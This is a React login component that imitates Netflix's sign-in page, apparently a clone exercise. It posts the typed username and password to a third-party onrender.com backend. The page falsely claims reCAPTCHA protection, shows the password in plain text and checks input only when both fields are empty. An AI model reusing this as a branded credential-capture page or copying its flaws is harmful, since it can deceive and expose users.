import React, { useState } from "react";
import "./index.css";
import axios from "axios"
import { Navigate, useNavigate } from "react-router-dom";
function Login(){

  const navigate = useNavigate()

  const [user,setuser] = useState("")
  const [pass,setpass] = useState("")
  const[error,setError]= useState("")
  

  const handleuser = (evt) =>
  {
    setuser(evt.target.value)
  }

  const handlepass = (evt) =>
  {
    setpass(evt.target.value)
  }

   const check = () =>
  {

    if( user.trim() === "" && pass.trim() === ""){
    setError("Please enter a valid username and password");
    return;
  }
   setError("");
    var login = axios.post("https://netflix-login-backend-eosx.onrender.com/login",{"username":user,"password":pass})

    login.then(function(evt){
      if(evt.data===true)
      {
        navigate("/success")
      }
      else{
        setError("Please enter a valid username and password")
      }
    })

  }

  return (
    <div className="login">
      <div className="login__background">
        <h1 className="login_logo">NetFlix</h1>

      </div>

      <div className="login_form">
      <div className="login_enter">
        <h1>Enter your info to sign in</h1>
        <h4>Or get started with a new account.</h4>
      </div>

      
      <div className="login_input">
        <input onChange={handleuser} name="username" placeholder="Email or Mobile Number"/> <br/>
        <input onChange={handlepass} name="password" placeholder="Password"></input> <br/>
        {error && <p className="error">{error}</p>}

        <button onClick={check}>Continue</button>
      </div>
      </div>
      

      <div className="login_bottom">
      <h4>Get Help</h4>

      <div className="login_para">
      <p className="login_bot">This page is protected by Google reCAPTCHA to ensure you're not a bot.</p>
      <p className="login_learn">Learn more</p>
      </div>
      </div>
      
      
    </div>
  );
}

export default Login;